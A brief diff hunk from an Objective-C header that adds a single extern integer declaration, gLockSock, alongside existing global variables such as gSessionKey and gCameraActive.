@@ -449,6 +449,7 @@ extern NSString *gConfigurationUpdateName;
 extern BOOL     gAgentCrisis;
 extern NSData   *gSessionKey;
 extern BOOL     gCameraActive;
+extern int      gLockSock;
 
 // OS version
 extern u_int gOSMajor;
